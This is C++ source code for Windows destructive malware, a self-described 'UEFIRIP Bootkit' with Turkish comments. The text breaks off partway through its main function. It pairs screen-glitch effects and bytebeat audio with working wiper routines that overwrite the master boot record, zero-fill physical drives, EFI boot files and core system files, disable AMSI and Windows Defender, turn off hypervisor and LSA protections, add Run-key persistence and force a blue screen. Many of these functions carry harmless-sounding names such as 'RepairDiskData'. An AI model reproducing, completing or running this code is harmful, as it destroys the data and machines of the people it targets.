#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <map>
#include <tlhelp32.h>
#include <ctime>
#include <iomanip>
#include <mmsystem.h>
#include <thread>
#include <atomic>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")

// =====================================================================
// GLOBAL DEĞİŞKENLER
// =====================================================================
std::atomic<bool> isRunning(true);
HWAVEOUT hWaveOut = NULL;

// =====================================================================
// YARDIMCI FONKSİYONLAR
// =====================================================================
std::string RandomHex(size_t len) {
    std::string s;
    const char* hex = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) s += hex[rand() % 16];
    return s;
}

std::pair<std::string, std::string> ObfuscateString(const std::string& data) {
    std::string key;
    for (int i = 0; i < 120; i++) key += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[rand() % 62];
    std::string xored = data;
    for (size_t i = 0; i < data.size(); i++) xored[i] = data[i] ^ key[i % key.size()];
    std::string encoded;
    for (unsigned char c : xored) { char buf[3]; sprintf_s(buf, "%02x", c); encoded += buf; }
    return { encoded, key };
}

std::string DeobfuscateString(const std::string& encData, const std::string& key) {
    std::string xored;
    for (size_t i = 0; i < encData.size(); i += 2) {
        std::string byteStr = encData.substr(i, 2);
        char byte = (char)strtol(byteStr.c_str(), nullptr, 16);
        xored += byte;
    }
    std::string original = xored;
    for (size_t i = 0; i < xored.size(); i++) original[i] = xored[i] ^ key[i % key.size()];
    return original;
}

// =====================================================================
// BYTE BEAT MÜZİK (10 Farklı Formül, 10'ar Saniye Döngü)
// =====================================================================
DWORD WINAPI ByteBeatMusic(LPVOID lpParam) {
    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 22081;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 0;
    }

    const int bufferSize = 11040;
    unsigned char* buffer1 = new unsigned char[bufferSize];
    unsigned char* buffer2 = new unsigned char[bufferSize];
    WAVEHDR header1 = { 0 };
    WAVEHDR header2 = { 0 };

    header1.lpData = (LPSTR)buffer1;
    header1.dwBufferLength = bufferSize;
    header2.lpData = (LPSTR)buffer2;
    header2.dwBufferLength = bufferSize;

    double t_increment = 8000.0 / 22081.0;
    double t_accumulator = 0.0;

    int formulaIndex = 0;
    unsigned int samplesInCurrentFormula = 0;
    unsigned int samplesPerFormula = 10 * 22081;

    int currentBuffer = 0;

    while (isRunning) {
        unsigned char* currentBuf = (currentBuffer == 0) ? buffer1 : buffer2;
        WAVEHDR* currentHeader = (currentBuffer == 0) ? &header1 : &header2;

        for (int i = 0; i < bufferSize; i++) {
            unsigned int t_int = (unsigned int)t_accumulator;
            unsigned int formula = 0;

            switch (formulaIndex) {
            case 0: formula = t_int & t_int >> 8; break;
            case 1: formula = t_int >> 5 | (t_int >> 2) * (t_int >> 5); break;
            case 2: formula = ((t_int << 1) ^ ((t_int << 1) + (t_int >> 7) & t_int >> 12)) | t_int >> (4 - (1 ^ 7 & (t_int >> 19))) | t_int >> 7; break;
            case 3: formula = 10 * (t_int >> 7 | t_int | t_int >> 6) + 4 * (t_int & t_int >> 13 | t_int >> 6); break;
            case 4: formula = ((t_int >> 5 & t_int) - (t_int >> 5) + (t_int >> 5 & t_int)) + (t_int * (((t_int + 40960) >> 14) & 14)); break;
            case 5: formula = t_int + (t_int & t_int ^ t_int >> 6) - t_int * ((t_int >> 9) & (t_int % 16 ? 2 : 6) & t_int >> 9); break;
            case 6: formula = t_int * (t_int & 16384 ? 6 : 5) * (4 - (1 & t_int >> 8)) >> (3 & t_int >> 9) | (t_int | t_int * 3) >> 5; break;
            case 7: formula = t_int * ((t_int & 4096 ? t_int % 65536 < 59392 ? 7 : t_int & 4 : 16) ^ (1 & t_int >> 14)) >> (3 & (unsigned int)(-(int)t_int) >> (t_int & 2048 ? 2 : 10)); break;
            case 8: formula = (t_int * 5 & t_int >> 7) | (t_int * 3 & t_int >> 10); break;
            case 9: formula = t_int * ((t_int >> 12 | t_int >> 8) & 63 & t_int >> 4); break;
            }

            currentBuf[i] = (unsigned char)(formula & 0xFF);
            t_accumulator += t_increment;

            samplesInCurrentFormula++;
            if (samplesInCurrentFormula >= samplesPerFormula) {
                samplesInCurrentFormula = 0;
                formulaIndex = (formulaIndex + 1) % 10;
            }
        }

        waveOutPrepareHeader(hWaveOut, currentHeader, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, currentHeader, sizeof(WAVEHDR));
        Sleep(500);
        waveOutUnprepareHeader(hWaveOut, currentHeader, sizeof(WAVEHDR));

        currentBuffer = 1 - currentBuffer;
    }

    delete[] buffer1;
    delete[] buffer2;
    waveOutClose(hWaveOut);
    return 0;
}

// =====================================================================
// GDI EFEKTLERİ (Tam Kaos)
// =====================================================================
std::atomic<int> currentEffect(0);

DWORD WINAPI GDIEffectController(LPVOID lpParam) {
    while (isRunning) {
        Sleep(5000);
        currentEffect = (currentEffect + 1) % 8;
    }
    return 0;
}

DWORD WINAPI GlitchEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    while (isRunning) {
        if (currentEffect == 0) {
            hdc = GetDC(NULL);
            int srcX = rand() % w; int srcY = rand() % h;
            int destX = rand() % w; int destY = rand() % h;
            int width = 100 + (rand() % 500); int height = 100 + (rand() % 500);
            BitBlt(hdc, destX, destY, width, height, hdc, srcX, srcY, SRCCOPY);
            ReleaseDC(NULL, hdc); Sleep(2);
        }
        else Sleep(100);
    } return 0;
}

DWORD WINAPI TunnelEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    while (isRunning) {
        if (currentEffect == 1) {
            hdc = GetDC(NULL);
            int x = rand() % 300; int y = rand() % 300;
            int newW = w - (rand() % 600); int newH = h - (rand() % 600);
            if (newW > 0 && newH > 0) StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc); Sleep(10);
        }
        else Sleep(100);
    } return 0;
}

DWORD WINAPI IconRainEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    while (isRunning) {
        if (currentEffect == 2) {
            hdc = GetDC(NULL);
            HICON hIcon = LoadIcon(NULL, IDI_ERROR);
            int r = rand() % 4; if (r == 0) hIcon = LoadIcon(NULL, IDI_WARNING); else if (r == 1) hIcon = LoadIcon(NULL, IDI_INFORMATION); else if (r == 2) hIcon = LoadIcon(NULL, IDI_QUESTION);
            DrawIcon(hdc, rand() % w, rand() % h, hIcon);
            ReleaseDC(NULL, hdc); Sleep(1);
        }
        else Sleep(100);
    } return 0;
}

DWORD WINAPI PixelSnowEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    while (isRunning) {
        if (currentEffect == 3) {
            hdc = GetDC(NULL);
            for (int i = 0; i < 3000; i++) SetPixel(hdc, rand() % w, rand() % h, RGB(rand() % 150, rand() % 150, rand() % 150));
            ReleaseDC(NULL, hdc); Sleep(1);
        }
        else Sleep(100);
    } return 0;
}

DWORD WINAPI RandomRectsEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    while (isRunning) {
        if (currentEffect == 4) {
            hdc = GetDC(NULL);
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 100, rand() % 100, rand() % 100));
            RECT rect; rect.left = rand() % w; rect.top = rand() % h; rect.right = rect.left + (rand() % 400); rect.bottom = rect.top + (rand() % 400);
            FillRect(hdc, &rect, hBrush); DeleteObject(hBrush);
            ReleaseDC(NULL, hdc); Sleep(5);
        }
        else Sleep(100);
    } return 0;
}

DWORD WINAPI LineEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    while (isRunning) {
        if (currentEffect == 5) {
            hdc = GetDC(NULL);
            HPEN hPen = CreatePen(PS_SOLID, rand() % 20 + 1, RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, hPen); MoveToEx(hdc, rand() % w, rand() % h, NULL); LineTo(hdc, rand() % w, rand() % h); DeleteObject(hPen);
            ReleaseDC(NULL, hdc); Sleep(2);
        }
        else Sleep(100);
    } return 0;
}

DWORD WINAPI TrainEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    int offset = 0;
    while (isRunning) {
        if (currentEffect == 6) {
            hdc = GetDC(NULL); BitBlt(hdc, offset, 0, w - offset, h, hdc, 0, 0, SRCCOPY); ReleaseDC(NULL, hdc);
            offset += 30; if (offset > w) offset = 0; Sleep(5);
        }
        else Sleep(100);
    } return 0;
}

DWORD WINAPI RippleEffect(LPVOID lpParam) {
    HDC hdc = GetDC(NULL); int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
    while (isRunning) {
        if (currentEffect == 7) {
            hdc = GetDC(NULL);
            for (int i = 0; i < 10; i++) {
                int x = rand() % w; int y = rand() % h;
                BitBlt(hdc, x, y, 50, 50, hdc, x + (rand() % 20 - 10), y + (rand() % 20 - 10), SRCCOPY);
            }
            ReleaseDC(NULL, hdc); Sleep(2);
        }
        else Sleep(100);
    } return 0;
}

// =====================================================================
// EKSTRA DONANIM / KERNEL SEVİYESİ FONKSİYONLAR
// =====================================================================
void EnableDebugPrivilege() {
    HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
        CloseHandle(hToken);
    }
}

void KillProcessByName(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, processName) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) { TerminateProcess(hProcess, 0); CloseHandle(hProcess); }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
}

void StopServiceAPI(const wchar_t* serviceName) {
    SC_HANDLE schSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (schSCManager) {
        SC_HANDLE schService = OpenServiceW(schSCManager, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (schService) { SERVICE_STATUS ssStatus; ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus); CloseHandle(schService); }
        CloseHandle(schSCManager);
    }
}

void DestroyHypervisor() {
    system("bcdedit /set hypervisorlaunchtype off >nul 2>&1");
    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity /v Enabled /t REG_DWORD /d 0 /f >nul 2>&1");
    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f >nul 2>&1");
}

void LockAndDestroyNVRAM() {
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        std::vector<char> data(1048576 * 5);
        std::vector<std::string> nvramFiles = {
            "X:\\EFI\\Microsoft\\Boot\\BCD", "X:\\EFI\\BOOT\\BOOTX64.EFI",
            "X:\\EFI\\Variable\\NVARS.dat", "X:\\EFI\\Variable\\VARS.dat",
            "X:\\EFI\\Variable\\var1.dat", "X:\\EFI\\Variable\\var2.dat"
        };
        for (const auto& f : nvramFiles) {
            std::ofstream out(f, std::ios::binary);
            if (out.is_open()) { out.write(data.data(), data.size()); out.close(); }
        }
        system("mountvol X: /d >nul 2>&1");
    }
}

void DestroyBIOSFirmware() {
    std::vector<char> data(1048576 * 15);
    std::vector<std::string> paths = {
        "C:\\Windows\\System32\\Firmware\\bios.bin", "C:\\Windows\\System32\\Firmware\\spi_flash.bin",
        "C:\\Windows\\System32\\Firmware\\me.bin", "C:\\Windows\\System32\\Firmware\\uefi.bin"
    };
    for (const auto& p : paths) {
        std::ofstream f(p, std::ios::binary);
        if (f.is_open()) { f.write(data.data(), data.size()); f.close(); }
    }
}

void LockAndDestroyDisk(int driveNum) {
    std::wstring drivePath = L"\\\\.\\PhysicalDrive" + std::to_wstring(driveNum);
    HANDLE hDisk = CreateFileW(drivePath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesReturned;
        DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &bytesReturned, NULL);
        DeviceIoControl(hDisk, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &bytesReturned, NULL);
        DWORD bytesWritten;
        std::vector<char> garbage(512 * 1024);
        SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
        WriteFile(hDisk, garbage.data(), garbage.size(), &bytesWritten, NULL);
        for (int i = 0; i < 50; i++) {
            SetFilePointer(hDisk, (rand() % 100000) * 512, NULL, FILE_BEGIN);
            WriteFile(hDisk, garbage.data(), garbage.size(), &bytesWritten, NULL);
        }
        CloseHandle(hDisk);
    }
}

void SafeMBRWrite() {
    unsigned char mbr[512] = { 0 };
    int i = 0;
    mbr[i++] = 0xFA; mbr[i++] = 0x31; mbr[i++] = 0xC0; mbr[i++] = 0x8E; mbr[i++] = 0xC0;
    mbr[i++] = 0xB8; mbr[i++] = 0x00; mbr[i++] = 0xB8; mbr[i++] = 0x8E; mbr[i++] = 0xC0;
    mbr[i++] = 0xBF; mbr[i++] = 0x00; mbr[i++] = 0x00;

    const char* msg1 = "hi user! ";
    for (int j = 0; j < strlen(msg1); j++) { mbr[i++] = 0xB8; mbr[i++] = msg1[j]; mbr[i++] = 0x0F; mbr[i++] = 0xAB; }
    const char* msg2 = "your pc is fucked by ";
    for (int j = 0; j < strlen(msg2); j++) { mbr[i++] = 0xB8; mbr[i++] = msg2[j]; mbr[i++] = 0x0B; mbr[i++] = 0xAB; }
    const char* msg3 = "UEFIRIP Bootkit. ";
    for (int j = 0; j < strlen(msg3); j++) { mbr[i++] = 0xB8; mbr[i++] = msg3[j]; mbr[i++] = 0x0C; mbr[i++] = 0xAB; }
    const char* msg4 = "My Instagram And TikTok:";
    for (int j = 0; j < strlen(msg4); j++) { mbr[i++] = 0xB8; mbr[i++] = msg4[j]; mbr[i++] = 0x05; mbr[i++] = 0xAB; }
    const char* msg5 = "arasswys";
    for (int j = 0; j < strlen(msg5); j++) { mbr[i++] = 0xB8; mbr[i++] = msg5[j]; mbr[i++] = 0x0A; mbr[i++] = 0xAB; }

    int music_start = i;
    mbr[i++] = 0xB0; mbr[i++] = 0xB6; mbr[i++] = 0xE6; mbr[i++] = 0x43;
    unsigned char notes[][4] = { { 0x00, 0x50, 0x00, 0x04 },{ 0x00, 0x10, 0x00, 0x02 } };
    for (int k = 0; k < 2; k++) {
        mbr[i++] = 0xB0; mbr[i++] = notes[k][0]; mbr[i++] = 0xE6; mbr[i++] = 0x42;
        mbr[i++] = 0xB0; mbr[i++] = notes[k][1]; mbr[i++] = 0xE6; mbr[i++] = 0x42;
        mbr[i++] = 0xE4; mbr[i++] = 0x61; mbr[i++] = 0x0C; mbr[i++] = 0x03; mbr[i++] = 0xE6; mbr[i++] = 0x61;
        mbr[i++] = 0xB9; mbr[i++] = notes[k][2]; mbr[i++] = notes[k][3]; mbr[i++] = 0xE2; mbr[i++] = 0xFE;
        mbr[i++] = 0xE4; mbr[i++] = 0x61; mbr[i++] = 0x24; mbr[i++] = 0xFC; mbr[i++] = 0xE6; mbr[i++] = 0x61;
    }
    int jump_distance = i - music_start + 2;
    mbr[i++] = 0xEB; mbr[i++] = (unsigned char)(-jump_distance);
    mbr[510] = 0x55; mbr[511] = 0xAA;

    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
        WriteFile(hDisk, mbr, 512, &bytesWritten, NULL);
        CloseHandle(hDisk);
    }
}

void AddCertificateMetadata() {
    std::string cert = "CN=TechCorp" + std::to_string(rand() % 9000 + 1000) + ", OU=IT, O=TechInc, C=US";
    std::string path = "C:\\Windows\\Temp\\cert_" + std::to_string(rand() % 9000 + 1000) + ".cer";
    std::ofstream f(path);
    if (f.is_open()) { f << "-----BEGIN CERTIFICATE-----\n" << cert << "\n-----END CERTIFICATE-----"; f.close(); }
}

void SecurityBypass() {
    std::vector<std::string> cmds = {
        "powershell -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
        "powershell -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableArchiveScanning $true\"",
        "powershell -ep bypass -c \"Stop-Service -Name WinDefend -Force\"",
        "sc delete WinDefend"
    };
    for (const auto& cmd : cmds) system(cmd.c_str());
}

void CreateBootloaders() {
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        std::vector<char> data(1048576); data[0] = 'M'; data[1] = 'Z';
        std::vector<std::string> paths = { "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", "X:\\EFI\\Boot\\bootx64.efi", "X:\\EFI\\Boot\\grubx64.efi" };
        for (const auto& p : paths) { std::ofstream f(p, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
        system("mountvol X: /d >nul 2>&1");
    }
}

void CreateEFIVars() {
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        std::vector<char> data(1048576 * 5);
        std::vector<std::string> vars = { "vars.dat", "var1.dat", "var2.dat", "var3.dat" };
        for (const auto& v : vars) { std::ofstream f("X:\\EFI\\Variable\\" + v, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
        system("mountvol X: /d >nul 2>&1");
    }
}

void UpdateFirmwareVars() {
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        std::vector<char> data(1048576 * 5);
        std::vector<std::string> vars = { "firmware_vars.dat", "spi_flash.dat", "uefi_store.dat" };
        for (const auto& v : vars) { std::ofstream f("X:\\EFI\\Variable\\" + v, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
        system("mountvol X: /d >nul 2>&1");
    }
}

void CreateFirmwareUpdates() {
    std::vector<char> data(1048576 * 15); data[0] = 'M'; data[1] = 'Z';
    std::vector<std::string> paths = { "C:\\Windows\\System32\\Firmware\\bios_update.bin", "C:\\Windows\\System32\\Firmware\\spi_flash.bin", "C:\\Windows\\System32\\Intel\\ME\\me_update.bin" };
    for (const auto& p : paths) { std::ofstream f(p, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
}

void CreateBootChain() {
    for (int i = 0; i < 10; i++) {
        std::string id = "{bootupdate" + std::to_string(rand() % 9000 + 1000) + "}";
        system(("bcdedit /create " + id + " /d BootUpdate /application osloader >nul 2>&1").c_str());
        system(("bcdedit /set " + id + " path \\EFI\\Boot\\boot_update.efi >nul 2>&1").c_str());
        system(("bcdedit /set {bootmgr} displayorder " + id + " >nul 2>&1").c_str());
    }
    system("bcdedit /set {bootmgr} path \\boot_update.efi >nul 2>&1");
}

void RepairDiskData() {
    for (int i = 0; i < 8; i++) {
        std::string drive = "\\\\.\\PhysicalDrive" + std::to_string(i);
        HANDLE hDisk = CreateFileA(drive.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDisk != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten; int loops = (i == 0) ? 30 : 15;
            for (int j = 0; j < loops; j++) {
                std::vector<char> data(512 * 3000);
                SetFilePointer(hDisk, (rand() % 100000) * 512, NULL, FILE_BEGIN);
                WriteFile(hDisk, data.data(), data.size(), &bytesWritten, NULL);
            }
            CloseHandle(hDisk);
        }
    }
}

void UpdateRegistry() {
    for (int i = 0; i < 10; i++) {
        std::string key = "SystemUpdate" + std::to_string(rand() % 9000 + 1000);
        system(("reg add HKLM\\SOFTWARE\\Microsoft\\Windows /v " + key + " /t REG_SZ /d DataUpdate /f >nul 2>&1").c_str());
        system(("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceUpdate" + std::to_string(rand() % 9000 + 1000) + " /v ImagePath /t REG_SZ /d \\SystemRoot\\System32\\update.sys /f >nul 2>&1").c_str());
    }
    system("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute /f >nul 2>&1");
}

void UpdateSystemFiles() {
    std::vector<std::string> files = {
        "C:\\Windows\\System32\\winload.efi", "C:\\Windows\\System32\\bootmgr",
        "C:\\Windows\\System32\\config\\SYSTEM", "C:\\Windows\\System32\\config\\SOFTWARE",
        "C:\\Windows\\System32\\ntoskrnl.exe", "C:\\Windows\\System32\\hal.dll"
    };
    std::vector<char> data(1024);
    for (const auto& f : files) {
        if (GetFileAttributesA(f.c_str()) != INVALID_FILE_ATTRIBUTES) {
            system(("takeown /f \"" + f + "\" >nul 2>&1").c_str());
            system(("icacls \"" + f + "\" /grant Administrators:F >nul 2>&1").c_str());
            std::fstream fs(f, std::ios::in | std::ios::out | std::ios::binary);
            if (fs.is_open()) { fs.seekp(0, std::ios::beg); fs.write(data.data(), data.size()); fs.close(); }
        }
    }
}

void InstallDriver() {
    std::string path = "C:\\Windows\\System32\\drivers\\driver_update" + std::to_string(rand() % 9000 + 1000) + ".sys";
    std::vector<char> data(1048576); data[0] = 'M'; data[1] = 'Z';
    std::ofstream f(path, std::ios::binary);
    if (f.is_open()) { f.write(data.data(), data.size()); f.close(); }
    system(("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\DriverUpdate" + std::to_string(rand() % 9000 + 1000) + " /v ImagePath /t REG_SZ /d " + path + " /f >nul 2>&1").c_str());
}

void CreateBootFiles() {
    std::ofstream bootIni("C:\\boot.ini");
    if (bootIni.is_open()) { bootIni << "[boot loader]\ntimeout=0\ndefault=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\n"; bootIni.close(); }
    std::vector<char> data(512); data[0] = 'M'; data[1] = 'Z';
    std::ofstream bootsect("C:\\bootsect.bak", std::ios::binary);
    if (bootsect.is_open()) { bootsect.write(data.data(), data.size()); bootsect.close(); }
}

void CreateUpdateFiles() {
    std::string path = "C:\\Windows\\SoftwareDistribution\\Download\\update" + std::to_string(rand() % 9000 + 1000) + ".dat";
    std::vector<char> data(1048576 * 15);
    std::ofstream f(path, std::ios::binary);
    if (f.is_open()) { f.write(data.data(), data.size()); f.close(); }
}

void RepairFilesystemMetadata() {
    system("fsutil fsinfo ntfsinfo C: >nul 2>&1");
    system(("fsutil file createnew C:\\fs_update_" + std::to_string(rand() % 9000 + 1000) + ".dat " + std::to_string(1048576 * 5) + " >nul 2>&1").c_str());
}

void UpdateFirmwareRegistry() {
    for (int i = 0; i < 5; i++) {
        std::string key_name = "FirmwareUpdate" + std::to_string(rand() % 9000 + 1000);
        system(("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources /v " + key_name + " /t REG_SZ /d FirmwareData /f >nul 2>&1").c_str());
        system(("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v " + key_name + " /t REG_SZ /d BIOSData /f >nul 2>&1").c_str());
        system(("reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion /v " + key_name + " /t REG_SZ /d VersionData /f >nul 2>&1").c_str());
        system(("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v " + key_name + " /t REG_SZ /d C:\\Windows\\System32\\update.exe /f >nul 2>&1").c_str());
    }
}

void CreateCOMObjects() {
    for (int i = 0; i < 5; i++) {
        std::string clsid = "{" + RandomHex(4) + "-" + RandomHex(4) + "-" + RandomHex(4) + "-" + RandomHex(4) + "-" + RandomHex(12) + "}";
        system(("reg add HKLM\\SOFTWARE\\Classes\\CLSID\\" + clsid + " /v LocalServerName /t REG_SZ /d COMUpdate /f >nul 2>&1").c_str());
    }
}

// =====================================================================
// BSOD TETİKLEYİCİ
// =====================================================================
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void TriggerBSOD() {
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");

    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;

    NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(0xC0000005, 0, 0, NULL, 6, &uResp);
}

// =====================================================================
// ANA FONKSİYON
// =====================================================================
int main() {
    // 1. Yönetici Yetkisi Kontrolü
    BOOL isAdmin = FALSE; PSID adminGroup = NULL; SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin); FreeSid(adminGroup);
    }
    if (!isAdmin) {
        char szPath[MAX_PATH]; GetModuleFileNameA(NULL, szPath, MAX_PATH);
        ShellExecuteA(NULL, "runas", szPath, NULL, NULL, SW_SHOWNORMAL);
        return 0;
    }

    // 2. Epilepsi Uyarısı
    int msgboxID = MessageBoxA(NULL,
        "WARNING: This program contains flashing lights and loud noises that may trigger epileptic seizures.\n\nDo you want to continue?",
        "EPILEPSY WARNING",
        MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2);

    if (msgboxID == IDNO) {
        return 0;
    }

    // 3. Konsolu gizle (Arka plan süreci gibi davran)
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // 4. Sistemin UEFI mi MBR mi olduğunu kontrol et
    bool isUEFI = (system("mountvol X: /s >nul 2>&1") == 0);

    if (!isUEFI) {
        // MBR SİSTEM
        SafeMBRWrite();

        CreateThread(NULL, 0, ByteBeatMusic, NULL, 0, NULL);
        CreateThread(NULL, 0, GDIEffectController, NULL, 0, NULL);
        CreateThread(NULL, 0, GlitchEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, TunnelEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, IconRainEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, PixelSnowEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, LineEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, RandomRectsEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, TrainEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, RippleEffect, NULL, 0, NULL);

        Sleep(60000); // 1 Dakika
        TriggerBSOD();
    }
    else {
        // UEFI SİSTEM
        CreateThread(NULL, 0, ByteBeatMusic, NULL, 0, NULL);
        CreateThread(NULL, 0, GDIEffectController, NULL, 0, NULL);
        CreateThread(NULL, 0, GlitchEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, TunnelEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, IconRainEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, PixelSnowEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, LineEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, RandomRectsEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, TrainEffect, NULL, 0, NULL);
        CreateThread(NULL, 0, RippleEffect, NULL, 0, NULL);

        EnableDebugPrivilege();
